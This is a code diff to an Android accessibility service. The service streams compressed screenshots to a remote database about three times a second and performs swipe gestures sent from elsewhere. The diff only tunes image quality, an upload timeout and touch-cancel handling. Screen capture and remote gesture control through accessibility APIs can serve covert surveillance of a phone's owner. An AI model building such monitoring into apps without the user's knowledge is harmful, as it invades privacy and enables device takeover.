@@ -29,9 +29,9 @@ public class MyAccessibilityService extends AccessibilityService {
     private long swipeStartTime = 0;
     private long lastTouchTime = 0;
     
-    // Smart Frame Dropping Flags
     private boolean isTakingScreenshot = false;
     private boolean isUploading = false;
+    private android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
 
     @Override
     public void onServiceConnected() {
@@ -45,7 +45,6 @@ public class MyAccessibilityService extends AccessibilityService {
     }
 
     private void startScreenshotLoop() {
-        android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
         handler.post(new Runnable() {
             @Override
             public void run() {
@@ -59,7 +58,7 @@ public class MyAccessibilityService extends AccessibilityService {
                             if (bitmap != null) {
                                 Bitmap scaled = Bitmap.createScaledBitmap(bitmap, 270, 480, false);
                                 ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                                scaled.compress(Bitmap.CompressFormat.JPEG, 10, baos); // 10% Quality for super fast upload
+                                scaled.compress(Bitmap.CompressFormat.JPEG, 20, baos);
                                 String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
 
                                 Map<String, Object> frameData = new HashMap<>();
@@ -69,6 +68,9 @@ public class MyAccessibilityService extends AccessibilityService {
                                 frameData.put("timestamp", System.currentTimeMillis());
                                 
                                 isUploading = true;
+                                // Upload timeout (agar net slow hai to 1.5 sec me reset ho jaye)
+                                handler.postDelayed(() -> isUploading = false, 1500);
+
                                 screenRef.setValue(frameData).addOnCompleteListener(task -> {
                                     isUploading = false;
                                 });
@@ -83,7 +85,7 @@ public class MyAccessibilityService extends AccessibilityService {
                         }
                     });
                 }
-                handler.postDelayed(this, 300); // Target 3 FPS
+                handler.postDelayed(this, 300); 
             }
         });
     }
@@ -135,6 +137,9 @@ public class MyAccessibilityService extends AccessibilityService {
                                 performGesture(swipePath, duration);
                                 swipePath = null;
                             }
+                        } else if (action == android.view.MotionEvent.ACTION_CANCEL) {
+                            // PDF FIX: ACTION_CANCEL par path clear karo
+                            swipePath = null;
                         }
                     } catch (Exception e) { e.printStackTrace(); }
                 }
